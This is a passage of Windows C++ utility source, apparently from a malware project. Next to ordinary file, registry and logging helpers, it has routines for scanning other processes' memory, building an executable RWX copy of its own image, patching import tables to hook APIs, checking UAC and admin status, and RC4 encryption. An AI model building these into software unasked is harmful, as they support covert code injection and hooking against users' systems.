#include <intrin.h>
#include <stdio.h>
#include <windows.h>
#include <shlwapi.h>
#include <psapi.h>
#include <imagehlp.h>
#include <tlhelp32.h>
#include <shlobj.h>
#include <wininet.h>
#include <ShellAPI.h>

#include "utils.h"
#include "peldr.h"
#include "seccfg.h"

#define LOGS_FILE_NAME	"dddddddd.txt"

VOID Utils::WriteLogMessage(PCHAR DebugMessage)
{
	CHAR FolderPath[MAX_PATH], LogsFileName[MAX_PATH];

	GetTempPath(sizeof(FolderPath), FolderPath);
	PathCombine(LogsFileName, FolderPath, LOGS_FILE_NAME);
	Utils::FileWrite(LogsFileName, OPEN_ALWAYS, DebugMessage, (DWORD)lstrlen(DebugMessage), FILE_END);
}

PVOID Utils::ReadLogsFromFile(PDWORD Len)
{
	CHAR FolderPath[MAX_PATH], LogsFileName[MAX_PATH];
	PVOID Logs;

	GetTempPath(sizeof(FolderPath), FolderPath);
	PathCombine(LogsFileName, FolderPath, LOGS_FILE_NAME);
	if (Logs = Utils::FileRead(LogsFileName, Len)) DeleteFileA(LogsFileName);

	return Logs;
}

#if BO_DEBUG > 0

VOID __cdecl DbgMsg(PCHAR PrintFormat, ...)
{
	va_list VaList;
	CHAR FormatBuffer[1024];
	CHAR ModulePath[MAX_PATH];
	CHAR DebugMessage[1024*4];
	CHAR SysTime[30];

	Utils::PrintSystemTime(SysTime, RTL_NUMBER_OF(SysTime));
	
	GetModuleFileName(NULL, ModulePath, RTL_NUMBER_OF(ModulePath)-1);
	_snprintf(FormatBuffer, RTL_NUMBER_OF(FormatBuffer)-1, "%s [%s %d] 77 %s", SysTime, PathFindFileName(ModulePath), GetCurrentProcessId(), PrintFormat);

	va_start(VaList, PrintFormat);
	_vsnprintf(DebugMessage, RTL_NUMBER_OF(DebugMessage)-1, FormatBuffer, VaList);
	va_end(VaList);

	OutputDebugString(DebugMessage);
	Utils::WriteLogMessage(DebugMessage);
}
#endif

//----------------------------------------------------------------------------------------------------------------------------------------------------

PVOID __cdecl malloc(size_t Size)
{
	return HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, Size);
}

//----------------------------------------------------------------------------------------------------------------------------------------------------

VOID __cdecl free(PVOID Pointer)
{
	if(Pointer) HeapFree(GetProcessHeap(), 0, Pointer);
}

//----------------------------------------------------------------------------------------------------------------------------------------------------

PVOID __cdecl realloc(PVOID Pointer, size_t NewSize)
{
	return HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, Pointer, NewSize);
}

//----------------------------------------------------------------------------------------------------------------------------------------------------

PVOID __cdecl operator new(size_t Size)
{
	return malloc(Size);
}

//----------------------------------------------------------------------------------------------------------------------------------------------------

VOID __cdecl operator delete(PVOID Pointer)
{
	free(Pointer);
}

//----------------------------------------------------------------------------------------------------------------------------------------------------

int __cdecl _purecall()
{
	return 0;
}

//----------------------------------------------------------------------------------------------------------------------------------------------------

int xwcsicmp(wchar_t *s1, wchar_t *s2)
{
	wchar_t f, l;

	do
	{
		f = ((*s1 <= 'Z') && (*s1 >= 'A')) ? *s1 + 'a' - 'A' : *s1;
		l = ((*s2 <= 'Z') && (*s2 >= 'A')) ? *s2 + 'a' - 'A' : *s2;

		s1++;
		s2++;
	} 
	while ((f) && (f == l));

	return (int)(f - l);
}

//----------------------------------------------------------------------------------------------------------------------------------------------------

int xstrcmp(char *s1, char *s2)
{
	unsigned c1, c2;

	for (;;) 
	{
		c1 = *s1++;
		c2 = *s2++;

		if (c1 != c2) 
		{
			if (c1 > c2) return 1;

			return -1;
		}

		if (c1 == 0) return 0;
	}
}

//----------------------------------------------------------------------------------------------------------------------------------------------------

PCHAR UtiStrNCpyM(PCHAR pcSrc, DWORD_PTR dwLen)
{
	PCHAR pcResult;

	pcResult = (PCHAR)malloc(dwLen + 1);
	if (pcResult) lstrcpyn(pcResult, pcSrc, (int)dwLen + 1);

	return pcResult;
}

//----------------------------------------------------------------------------------------------------------------------------------------------------

VOID UtiStrNCpy(PCHAR pcDst, PCHAR pcSrc, DWORD_PTR dwLen)
{
	strncpy(pcDst, pcSrc, dwLen);
	*RtlOffsetToPointer(pcDst, dwLen) = '\0';
}

//----------------------------------------------------------------------------------------------------------------------------------------------------

size_t xstrlen(char *org)
{
	char *s = org;

	while (*s++);

	return --s - org;
}

//----------------------------------------------------------------------------------------------------------------------------------------------------

VOID xRtlInitAnsiString(PANSI_STRING DestinationString, PCHAR SourceString)
{
	SIZE_T DestSize;

	if (SourceString)
	{
		DestSize = xstrlen(SourceString);
		DestinationString->Length = (USHORT)DestSize;
		DestinationString->MaximumLength = (USHORT)DestSize + sizeof(CHAR);
	}
	else
	{
		DestinationString->Length = 0;
		DestinationString->MaximumLength = 0;
	}

	DestinationString->Buffer = (PCHAR)SourceString;
}

//----------------------------------------------------------------------------------------------------------------------------------------------------

VOID Utils::PrintSystemTime(PCHAR lpszBuf, DWORD cbBuf)
{
	SYSTEMTIME SysDate;
	CHAR szSysDate[128], szSysTime[65];

	GetLocalTime(&SysDate);
	GetDateFormat(0x0409, LOCALE_USE_CP_ACP, &SysDate, "yyyy-MM-dd", szSysDate, sizeof(szSysDate));
	GetTimeFormat(0x0409, LOCALE_USE_CP_ACP, &SysDate, "HH':'mm':'ss", szSysTime, sizeof(szSysTime));

	_snprintf(lpszBuf, cbBuf, "%s %s", szSysDate, szSysTime);
}

VOID Utils::GetRandomString(PCHAR lpszBuf, DWORD cbBuf)
{
	DWORD i;
	DWORD g_dwSeed = GetTickCount();
	
	for (i = 0; i < cbBuf; i++) lpszBuf[i] = (CHAR)('a' + (CHAR)(RtlRandom(&g_dwSeed) % ('z'-'a')));
	lpszBuf[i] = '\0';
}

// Utils
//----------------------------------------------------------------------------------------------------------------------------------------------------

LONG Utils::RegReadValue(HKEY RootKeyHandle, PCHAR SubKeyName, PCHAR ValueName, DWORD Type, PVOID Buffer, DWORD Len)
{
	HKEY KeyHandle;
	LONG ErrorCode;

	ErrorCode = RegOpenKeyEx(RootKeyHandle, SubKeyName, 0, KEY_QUERY_VALUE|KEY_WOW64_64KEY, &KeyHandle);
	if (ErrorCode == ERROR_SUCCESS)
	{
		ErrorCode = RegQueryValueEx(KeyHandle, ValueName, 0, &Type, (LPBYTE)Buffer, &Len);
		if (ErrorCode != ERROR_SUCCESS)
		{
			DbgMsg(__FUNCTION__"(): RegQueryValueEx error: %x\r\n", ErrorCode);
		}

		RegCloseKey(KeyHandle);
	}
	else
	{
		DbgMsg(__FUNCTION__"(): RegOpenKeyEx error: %x\r\n", ErrorCode);
	}

	return ErrorCode;
}

//----------------------------------------------------------------------------------------------------------------------------------------------------

DWORD Utils::_getValueAsBinaryEx(HKEY key, const LPSTR subKey, const LPSTR value, LPDWORD type, void **buffer)
{
  DWORD retVal = (DWORD)-1;
  *buffer      = NULL;

  if(RegOpenKeyExA(key, subKey, NULL, KEY_QUERY_VALUE|KEY_WOW64_64KEY, &key) == ERROR_SUCCESS)
  {
    DWORD bufferSize = 0;
    if(RegQueryValueExA(key, value, NULL, type, NULL, &bufferSize) == ERROR_SUCCESS)
    {
      if(bufferSize == 0)retVal = 0;
      else
      {
        LPBYTE p = (LPBYTE)malloc(bufferSize + sizeof(WCHAR) * 2/*\0\0 для REG_*SZ*/);
        if(p != NULL)
        {
          if(RegQueryValueExA(key, value, NULL, type, p, &bufferSize) == ERROR_SUCCESS)
          {
            *buffer = p;
            retVal  = bufferSize;
          }
          else free(p);
        }
      }
    }
    RegCloseKey(key);
  }
  return retVal;
}

//----------------------------------------------------------------------------------------------------------------------------------------------------

DWORD Utils::ThreadCreate(PVOID pvFunc, PVOID pvParam, PHANDLE phHandle, DWORD dwWaitSec)
{
	HANDLE hThread;
	DWORD dwExitCode = 0;

	hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pvFunc, pvParam, 0, NULL);
	if (hThread) 
	{
		if (phHandle) *phHandle = hThread;

		if (dwWaitSec)
		{
			if (WaitForSingleObject(hThread, dwWaitSec * 1000) == WAIT_OBJECT_0)
			{
				GetExitCodeThread(hThread, &dwExitCode);
			}
		}

		if (!phHandle) CloseHandle(hThread);
	}

	return dwExitCode;
}

//----------------------------------------------------------------------------------------------------------------------------------------------------

DWORD Utils::GetProcessIdByName(PCHAR ProcessName, PDWORD Processes, DWORD Max)
{
	DWORD Count = 0;
	PROCESSENTRY32 ProcessEntry = {0};
	HANDLE hSnap;

	hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnap != INVALID_HANDLE_VALUE)
	{
		ProcessEntry.dwSize = sizeof(ProcessEntry);
		if (Process32First(hSnap, &ProcessEntry))
		{
			do 
			{
				if (!lstrcmpi(ProcessName, PathFindFileName(ProcessEntry.szExeFile)))
				{
					if (Count < Max)
					{
						Processes[Count] = ProcessEntry.th32ProcessID;
						Count++;
					} 
					else break;
				}
			} 
			while (Process32Next(hSnap, &ProcessEntry));
		}

		CloseHandle(hSnap);
	}

	return Count;
}

//----------------------------------------------------------------------------------------------------------------------------------------------------

HANDLE Utils::FileLock(PCHAR lpFile, DWORD dwAccess, DWORD dwDisposition)
{
	HANDLE hFile;
	OVERLAPPED oOverlapped = {0};

	hFile = CreateFile(lpFile, dwAccess, FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE, NULL, dwDisposition, FILE_ATTRIBUTE_NORMAL, 0);
	if (hFile != INVALID_HANDLE_VALUE)
	{
		LockFileEx(hFile, FlagOn(dwAccess, GENERIC_WRITE) ? LOCKFILE_EXCLUSIVE_LOCK : 0, 0, -1, -1, &oOverlapped);
	}
	else
	{
		//DbgMsg(__FUNCTION__"(): CreateFile error 0x%x\r\n", GetLastError());
	}

	return hFile;
}

//----------------------------------------------------------------------------------------------------------------------------------------------------

VOID Utils::FileUnlock(HANDLE hFile)
{
	OVERLAPPED oOverlapped = {0};

	UnlockFileEx(hFile, 0, -1, -1, &oOverlapped);

	CloseHandle(hFile);
}

//----------------------------------------------------------------------------------------------------------------------------------------------------

BOOLEAN Utils::FileHandleWrite(HANDLE hFile, PVOID pvBuffer, DWORD dwBuffer, DWORD Pointer)
{
	BOOLEAN bRet;

	SetFilePointer(hFile, 0, NULL, Pointer);

	bRet = WriteFile(hFile, pvBuffer, dwBuffer, &dwBuffer, NULL);
	if (!bRet)
	{
		//DbgMsg(__FUNCTION__"(): WriteFile error 0x%x\r\n", GetLastError());
	}

	SetEndOfFile(hFile);

	return bRet;
}

//----------------------------------------------------------------------------------------------------------------------------------------------------

BOOLEAN Utils::FileWrite(PCHAR FilePath, DWORD dwFlags, PVOID pvBuffer, DWORD dwSize, DWORD Pointer)
{
	BOOLEAN bRet = FALSE;
	HANDLE hFile;

	hFile = CreateFile(FilePath, GENERIC_WRITE, FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE, NULL, dwFlags, FILE_ATTRIBUTE_NORMAL, 0);
	if (hFile != INVALID_HANDLE_VALUE)
	{
		bRet = FileHandleWrite(hFile, pvBuffer, dwSize, Pointer);

		CloseHandle(hFile);
	}
	else
	{
		if (GetLastError() != ERROR_SHARING_VIOLATION)
		{
			DbgMsg(__FUNCTION__"(): CreateFile error 0x%x\r\n", GetLastError());
		}
	}

	return bRet;
}

//----------------------------------------------------------------------------------------------------------------------------------------------------

PVOID Utils::FileHandleRead(HANDLE hFile, PDWORD pdwBuffer)
{
	PVOID pvBuffer;
	DWORD dwBuffer;

	dwBuffer = GetFileSize(hFile, NULL);
	pvBuffer = malloc(dwBuffer + 1);
	if (pvBuffer)
	{
		if (dwBuffer) 
		{
			SetFilePointer(hFile, 0, NULL, FILE_BEGIN);

			if (!ReadFile(hFile, pvBuffer, dwBuffer, &dwBuffer, NULL))
			{
				DbgMsg(__FUNCTION__"(): ReadFile error 0x%x\r\n", GetLastError());
			}
		}

		if (pdwBuffer) *pdwBuffer = dwBuffer;
		*RtlOffsetToPointer(pvBuffer, dwBuffer) = '\0';
	}

	return pvBuffer;
}

//----------------------------------------------------------------------------------------------------------------------------------------------------

PVOID Utils::FileRead(PCHAR lpFile, PDWORD pdwSize)
{
	PVOID pvBuffer = NULL;
	HANDLE hFile;

	hFile = CreateFile(lpFile, GENERIC_READ, FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (hFile != INVALID_HANDLE_VALUE)
	{
		pvBuffer = FileHandleRead(hFile, pdwSize);

		CloseHandle(hFile);
	}
	else
	{
		if (GetLastError() != ERROR_SHARING_VIOLATION)
		{
			DbgMsg(__FUNCTION__"(): CreateFile error 0x%x\r\n", GetLastError());
		}
	}

	return pvBuffer;
}

//----------------------------------------------------------------------------------------------------------------------------------------------------
#ifndef _WIN64
//----------------------------------------------------------------------------------------------------------------------------------------------------

DWORD Utils::SearchBytesInMemory(PVOID RegionCopy, DWORD_PTR RegionSize, PVOID Bytes, DWORD Length)
{
	DWORD Result = 0;
	DWORD i = 0;

	if (RegionSize >= Length)
	{
		for (;;)
		{
			PVOID Pointer = RtlOffsetToPointer(RegionCopy, i);

			if (RtlCompareMemory(Pointer, Bytes, Length) == Length)
			{
				Result = i;

				break;
			}

			i++;

			if (Length + i > RegionSize) break;
		}
	}

	return Result;
}

//----------------------------------------------------------------------------------------------------------------------------------------------------

DWORD Utils::SearchDwordInMemory(PVOID RegionCopy, DWORD_PTR RegionSize, DWORD Dword)
{
	return (DWORD)RtlOffsetToPointer(RegionCopy, SearchBytesInMemory(RegionCopy, RegionSize, (PVOID)&Dword, 4));
}

//----------------------------------------------------------------------------------------------------------------------------------------------------

NTSTATUS Utils::MapSection(PWCHAR SectionName, PHANDLE SectionHandle, PVOID *BaseAddress, DWORD_PTR *ViewSize)
{
	NTSTATUS St;
	OBJECT_ATTRIBUTES ObjAttr;
	UNICODE_STRING UniSectionName;

	RtlInitUnicodeString(&UniSectionName, SectionName);
	InitializeObjectAttributes(&ObjAttr, &UniSectionName, OBJ_OPENIF, 0, NULL);
	St = NtOpenSection(SectionHandle, SECTION_MAP_READ|SECTION_MAP_WRITE, &ObjAttr);
	if (NT_SUCCESS(St))
	{
		*BaseAddress = NULL;
		*ViewSize = 0;

		St = NtMapViewOfSection(*SectionHandle, NtCurrentProcess(), BaseAddress, 0, 0, NULL, ViewSize, ViewUnmap, NULL, PAGE_READWRITE);
		if (!NT_SUCCESS(St))
		{
			DbgMsg(__FUNCTION__"(): NtMapViewOfSection: 0x%x\r\n", St);

			NtClose(*SectionHandle);
		}
	}
	else
	{
		DbgMsg(__FUNCTION__"(): NtOpenSection: 0x%x\r\n", St);
	}

	return St;
}

//----------------------------------------------------------------------------------------------------------------------------------------------------

DWORD Utils::SearchBytesInReadedMemory(HANDLE ProcessHandle, PVOID BaseAddress, DWORD_PTR Size, PVOID Bytes, DWORD Length)
{
	DWORD Result = 0;

	PVOID RegionCopy = VirtualAlloc(NULL, Size, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);
	if (RegionCopy)
	{
		SIZE_T t;
		if (ReadProcessMemory(ProcessHandle, BaseAddress, RegionCopy, Size, &t))
		{
			Result = Utils::SearchBytesInMemory(RegionCopy, Size, Bytes, Length);
		}

		VirtualFree(RegionCopy, 0, MEM_RELEASE);
	}

	return Result;
}

//----------------------------------------------------------------------------------------------------------------------------------------------------

PVOID Utils::SearchBytesInProcessMemory(HANDLE ProcessHandle, PVOID Bytes, DWORD Length)
{
	PVOID Result = NULL;
	PVOID BaseAddress = NULL;
	MEMORY_BASIC_INFORMATION Mbi;
	DWORD Index;

	for (;;)
	{
		if (VirtualQueryEx(ProcessHandle, BaseAddress, &Mbi, sizeof(Mbi)))
		{
			Index = Utils::SearchBytesInReadedMemory(ProcessHandle, BaseAddress, Mbi.RegionSize, Bytes, Length);
			if (Index)
			{
				Result = RtlOffsetToPointer(Mbi.AllocationBase, Index);
			}
		}
		else break;

		if (Result) break;

		BaseAddress = RtlOffsetToPointer(BaseAddress, Mbi.RegionSize);
	}

	return Result;
}

//----------------------------------------------------------------------------------------------------------------------------------------------------

DWORD Utils::SearchCodeInProcessModules(HANDLE ProcessHandle, PVOID Bytes, DWORD Length)
{
	DWORD Result = 0;
	BOOL bOk = FALSE;
	HMODULE *ProcessModules;
	DWORD Needed;

	ProcessModules = (HMODULE *)malloc(sizeof(HMODULE)*260);
	if (ProcessModules)
	{
		if (EnumProcessModules(ProcessHandle, ProcessModules, sizeof(HMODULE)*260, &Needed))
		{
			if (Needed > sizeof(HMODULE)*260)
			{
				ProcessModules = (HMODULE *)realloc(ProcessModules, Needed);
				if (ProcessModules)
				{
					bOk = EnumProcessModules(ProcessHandle, ProcessModules, sizeof(HMODULE)*260, &Needed);
				}
			}
			else bOk = TRUE;
		}

		if (bOk)
		{
			PUCHAR ModuleHeader = (PUCHAR)malloc(0x400);
			if (ModuleHeader)
			{
				for (DWORD i = 0; i < Needed/sizeof(HMODULE); i++)
				{
					SIZE_T t;
					if (ReadProcessMemory(ProcessHandle, ProcessModules[i], ModuleHeader, 0x400, &t))
					{
						PIMAGE_NT_HEADERS NtHeaders = PeLdr::PeImageNtHeader(ModuleHeader);
						if (NtHeaders)
						{
							PIMAGE_SECTION_HEADER SectionHeader = IMAGE_FIRST_SECTION(NtHeaders);

							for (WORD j = 0; j < NtHeaders->FileHeader.NumberOfSections; j++)
							{
								if (!lstrcmp((PCHAR)SectionHeader[j].Name, ".text") && FlagOn(SectionHeader[j].Characteristics, IMAGE_SCN_MEM_EXECUTE))
								{
									PVOID BaseAddress = RtlOffsetToPointer(ProcessModules[i], SectionHeader[j].VirtualAddress);
									DWORD Index = SearchBytesInReadedMemory(ProcessHandle, BaseAddress, SectionHeader[j].Misc.VirtualSize, Bytes, Length);
									if (Index)
									{
										Result = MAKE_PTR(BaseAddress, Index, DWORD);

										break;
									}
								}
							}
						}
					}

					if (Result) break;
				}

				free(ModuleHeader);
			}
		}

		free(ProcessModules);
	}

	return Result;
}

//----------------------------------------------------------------------------------------------------------------------------------------------------
#endif

BOOLEAN Utils::CreateImageSection(PCHAR pName, PVOID CurrentImageBase, DWORD CurrentImageSize, HANDLE *phCurrentImageSection)
{
	BOOLEAN bRet = FALSE;
	PVOID pMapping;

	*phCurrentImageSection = CreateFileMapping(0, NULL, PAGE_EXECUTE_READWRITE|SEC_COMMIT, 0, CurrentImageSize, pName);
	if (*phCurrentImageSection)
	{
		pMapping = MapViewOfFile(*phCurrentImageSection, FILE_MAP_ALL_ACCESS, 0, 0, 0);
		if (pMapping)
		{
			CopyMemory(pMapping, CurrentImageBase, CurrentImageSize);

			bRet = PeLdr::PeProcessRelocs(pMapping, PeLdr::PeGetImageBase(pMapping) - (DWORD_PTR)CurrentImageBase);

			UnmapViewOfFile(pMapping);
		}
		else
		{
			DbgMsg(__FUNCTION__"(): MapViewOfFile error: "IFMT"\n", GetLastError());
		}
	}
	else
	{
		DbgMsg(__FUNCTION__"(): CreateFileMapping error: "IFMT"\n", GetLastError());
	}

	return bRet;
}

//----------------------------------------------------------------------------------------------------------------------------------------------------

BOOL Utils::IsWow64(HANDLE ProcessHandle)
{
	BOOL bIsWow64 = FALSE;
	typedef BOOL (WINAPI *LPFN_ISWOW64PROCESS)(HANDLE, PBOOL);
	LPFN_ISWOW64PROCESS fnIsWow64Process;

	fnIsWow64Process = (LPFN_ISWOW64PROCESS)GetProcAddress(GetModuleHandle("kernel32"), "IsWow64Process");
	if (NULL != fnIsWow64Process)
	{
		fnIsWow64Process(ProcessHandle, &bIsWow64);
	}

	return bIsWow64;
}

//----------------------------------------------------------------------------------------------------------------------------------------------------

BOOLEAN Utils::ReplaceIAT(PCHAR ModuleName, PCHAR Current, PVOID New, HMODULE Module)
{
	BOOLEAN Result = FALSE;
	PIMAGE_IMPORT_DESCRIPTOR pImport;
	PDWORD_PTR thunkRef, funcRef;
	DWORD Old;

	pImport = (PIMAGE_IMPORT_DESCRIPTOR)PeLdr::PeImageDirectoryEntryToData((PVOID)Module, TRUE, IMAGE_DIRECTORY_ENTRY_IMPORT, NULL);
	if (pImport)
	{
		for (; pImport->Name; pImport++) 
		{
			if (!lstrcmpi(ModuleName, RtlOffsetToPointer(Module, pImport->Name)))
			{
				break;
			}
		}

		if (pImport->Name)
		{
			if (pImport->OriginalFirstThunk)
			{
				thunkRef = MAKE_PTR(Module, pImport->OriginalFirstThunk, PDWORD_PTR); 
				funcRef = MAKE_PTR(Module, pImport->FirstThunk, PDWORD_PTR);
			}
			else
			{
				thunkRef = MAKE_PTR(Module, pImport->FirstThunk, PDWORD_PTR); 
				funcRef = MAKE_PTR(Module, pImport->FirstThunk , PDWORD_PTR);      
			}

			for (; *thunkRef; thunkRef++, funcRef++)
			{
				if (!IMAGE_SNAP_BY_ORDINAL(*thunkRef))
				{
					if (!lstrcmp((PCHAR)&((PIMAGE_IMPORT_BY_NAME)RtlOffsetToPointer(Module, *thunkRef))->Name, Current)) 
					{
						if (VirtualProtect(funcRef, sizeof(PVOID), PAGE_EXECUTE_READWRITE, &Old))
						{
							if (WriteProcessMemory(NtCurrentProcess(), funcRef, &New, sizeof(New), NULL))
							{
								Result = TRUE;
							}
							else
							{
								DbgMsg(__FUNCTION__"(): WriteProcessMemory failed: %08X\r\n", GetLastError());
							}

							FlushInstructionCache(NtCurrentProcess(), &New, sizeof(New));

							VirtualProtect(funcRef, sizeof(PVOID), Old, &Old);
						}
						else
						{
							DbgMsg(__FUNCTION__"(): VirtualProtect failed: %08X\r\n", GetLastError());
						}
					}
				}
			}
		}
	}

	return Result;
}

//----------------------------------------------------------------------------------------------------------------------------------------------------

DWORD Utils::GetProcessIntegrityLevel()
{
	HANDLE hToken;
	DWORD dwLengthNeeded;
	PTOKEN_MANDATORY_LABEL pTIL;
	DWORD dwIntegrityLevel = 0;

	if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) 
	{
		if (!GetTokenInformation(hToken, TokenIntegrityLevel, NULL, 0, &dwLengthNeeded))
		{
			if (GetLastError() == ERROR_INSUFFICIENT_BUFFER)
			{
				pTIL = (PTOKEN_MANDATORY_LABEL)LocalAlloc(0, dwLengthNeeded);
				if (pTIL != NULL)
				{
					if (GetTokenInformation(hToken, TokenIntegrityLevel, pTIL, dwLengthNeeded, &dwLengthNeeded))
					{
						dwIntegrityLevel = *GetSidSubAuthority(pTIL->Label.Sid, (DWORD)(UCHAR)(*GetSidSubAuthorityCount(pTIL->Label.Sid)-1));
					}

					LocalFree(pTIL);
				}
			}
		}

		CloseHandle(hToken);
	}

	return dwIntegrityLevel;
}

//----------------------------------------------------------------------------------------------------------------------------------------------------

BOOL Utils::CheckAdmin()
{
	BOOL Ret;
	SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
	PSID AdministratorsGroup; 

	if (Ret = AllocateAndInitializeSid(&NtAuthority,2,SECURITY_BUILTIN_DOMAIN_RID,DOMAIN_ALIAS_RID_ADMINS,0,0,0,0,0,0,&AdministratorsGroup))
	{
		if (!CheckTokenMembership(NULL,AdministratorsGroup,&Ret))
		{
			Ret = FALSE;
		}

		FreeSid(AdministratorsGroup);
	}

	return Ret;
}

//----------------------------------------------------------------------------------------------------------------------------------------------------

BOOL Utils::CheckUAC()
{
	BOOL fIsElevated = FALSE;
	HANDLE hToken = NULL;

	if (OpenProcessToken(GetCurrentProcess(),TOKEN_QUERY,&hToken))
	{
		TOKEN_ELEVATION elevation;
		DWORD dwSize;

		if (GetTokenInformation(hToken,TokenElevation,&elevation,sizeof(elevation),&dwSize))
		{
			fIsElevated = !elevation.TokenIsElevated;
		}

		CloseHandle(hToken);
	}

	return fIsElevated;
}

//----------------------------------------------------------------------------------------------------------------------------------------------------

VOID Utils::UtiCryptRc4(PCHAR pcKey, DWORD dwKey, PVOID pvDst, PVOID pvSrc, DWORD dwLen)
{
	DWORD i = 0, j = 0, k = 0;
	UCHAR ucKey[256];
	UCHAR ucTemp;

	for (i = 0; i < sizeof(ucKey); i++) ucKey[i] = (CHAR)i;

	for (i = j = 0 ; i < sizeof(ucKey); i++)
	{
		j = (j + pcKey[i % dwKey] + ucKey[i]) % 256;

		ucTemp = ucKey[i];
		ucKey[i] = ucKey[j];
		ucKey[j] = ucTemp;
	}

	for (i = j = 0, k = 0; k < dwLen; k++)
	{
		i = (i + 1) % 256;
		j = (j + ucKey[i]) % 256;
		ucTemp = ucKey[i];
		ucKey[i] = ucKey[j];
		ucKey[j] = ucTemp;

		*RtlOffsetToPointer(pvDst, k) = *RtlOffsetToPointer(pvSrc, k) ^ ucKey[(ucKey[i] + ucKey[j]) % 256];
	}
}

//----------------------------------------------------------------------------------------------------------------------------------------------------

PVOID Utils::UtiCryptRc4M(PCHAR pcKey, DWORD dwKey, PVOID pvBuffer, DWORD dwBuffer)
{
	PVOID pvResult;

	pvResult = malloc(dwBuffer);
	if (pvResult)
	{
		UtiCryptRc4(pcKey, dwKey, pvResult, pvBuffer, dwBuffer);
	}

	return pvResult;
}

//----------------------------------------------------------------------------------------------------------------------------------------------------

BOOLEAN Utils::StringTokenBreak(PCHAR *ppcSrc, PCHAR pcToken, PCHAR *ppcBuffer)
{
	DWORD_PTR dwLen;
	PCHAR pcNext;
	DWORD_PTR dwToken = lstrlen(pcToken);

	if (*ppcSrc != NULL && (*ppcSrc)[0] != '\0')
	{
		*ppcBuffer = NULL;

		pcNext = StrStrI(*ppcSrc, pcToken);
		if (!pcNext)
		{
			dwLen = lstrlen(*ppcSrc);
			*ppcBuffer = UtiStrNCpyM(*ppcSrc, dwLen);

			*ppcSrc = pcNext;
		}
		else
		{
			dwLen = pcNext - *ppcSrc;
			*ppcBuffer = UtiStrNCpyM(*ppcSrc, dwLen);

			*ppcSrc = &pcNext[dwToken];
		}

		if (*ppcBuffer) return TRUE;
	}

	return FALSE;
}

//----------------------------------------------------------------------------------------------------------------------------------------------------

VOID Utils::GetWindowsVersion(PCHAR pcBuffer, DWORD dwSize)
{
	typedef void (WINAPI *PGNSI)(LPSYSTEM_INFO);
	OSVERSIONINFOEX osVerInfo = {0};
	SYSTEM_INFO si;

	osVerInfo.dwOSVersionInfoSize = sizeof(osVerInfo);
	GetVersionEx((LPOSVERSIONINFO)&osVerInfo);

	PGNSI pGNSI = (PGNSI) GetProcAddress(GetModuleHandle("kernel32.dll"), "GetNativeSystemInfo");
	if (NULL != pGNSI) pGNSI(&si); else GetSystemInfo(&si);

	LPSTR WindowsName;
	if(osVerInfo.dwMajorVersion == 5 && osVerInfo.dwMinorVersion == 0) WindowsName = "Windows 2000";
	else if(osVerInfo.dwMajorVersion == 5 && osVerInfo.dwMinorVersion == 1) WindowsName = "Windows XP";
	else if(osVerInfo.dwMajorVersion == 5 && osVerInfo.dwMinorVersion == 2 && osVerInfo.wProductType == VER_NT_WORKSTATION) WindowsName = "Windows XP Professional";
	else if(osVerInfo.dwMajorVersion == 5 && osVerInfo.dwMinorVersion == 2 && GetSystemMetrics(SM_SERVERR2) == 0) WindowsName = "Windows Server 2003";
	else if(osVerInfo.dwMajorVersion == 5 && osVerInfo.dwMinorVersion == 2 && (osVerInfo.wSuiteMask & VER_SUITE_WH_SERVER)) WindowsName = "Windows Home Server";
	else if(osVerInfo.dwMajorVersion == 5 && osVerInfo.dwMinorVersion == 2 && GetSystemMetrics(SM_SERVERR2) != 0) WindowsName = "Windows Server 2003 R2";
	else if(osVerInfo.dwMajorVersion == 6 && osVerInfo.dwMinorVersion == 0 && osVerInfo.wProductType == VER_NT_WORKSTATION) WindowsName = "Windows Vista";
	else if(osVerInfo.dwMajorVersion == 6 && osVerInfo.dwMinorVersion == 0 && osVerInfo.wProductType != VER_NT_WORKSTATION) WindowsName = "Windows Server 2008";
	else if(osVerInfo.dwMajorVersion == 6 && osVerInfo.dwMinorVersion == 1 && osVerInfo.wProductType != VER_NT_WORKSTATION) WindowsName = "Windows Server 2008 R2";
	else if(osVerInfo.dwMajorVersion == 6 && osVerInfo.dwMinorVersion == 1 && osVerInfo.wProductType == VER_NT_WORKSTATION) WindowsName = "Windows 7";
	else if(osVerInfo.dwMajorVersion == 6 && osVerInfo.dwMinorVersion == 2 && osVerInfo.wProductType != VER_NT_WORKSTATION) WindowsName = "Windows Server 2012";
	else if(osVerInfo.dwMajorVersion == 6 && osVerInfo.dwMinorVersion == 2 && osVerInfo.wProductType == VER_NT_WORKSTATION) WindowsName = "Windows 8";
	else WindowsName = "Unidentified";

	_snprintf(pcBuffer, dwSize, "%s %04d sp%1d.%1d %s", 
		WindowsName, 
		osVerInfo.dwBuildNumber,
		osVerInfo.wServicePackMajor, 
		osVerInfo.wServicePackMinor,
		si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 ? "64bit" : "32bit");
}

//----------------------------------------------------------------------------------------------------------------------------------------------------

VOID Utils::GetParrentProcessName(PCHAR FileName, DWORD Size)
{
	PROCESS_BASIC_INFORMATION ProcessInfo;
	HANDLE ProcessHandle;
	DWORD Length;

	ZeroMemory(FileName, Size);
	NtQueryInformationProcess(NtCurrentProcess(), ProcessBasicInformation, &ProcessInfo, sizeof(ProcessInfo), &Length);
	ProcessHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, (DWORD)ProcessInfo.InheritedFromUniqueProcessId);
	if (ProcessHandle != INVALID_HANDLE_VALUE)
	{
		GetModuleFileNameEx(ProcessHandle, NULL, FileName, Size);

		CloseHandle(ProcessHandle);
	}
}

//----------------------------------------------------------------------------------------------------------------------------------------------------

BOOL Utils::SetPrivilege(char* SeNamePriv, BOOL EnableTF)
{
	HANDLE hToken;
	LUID SeValue;
	TOKEN_PRIVILEGES tp;

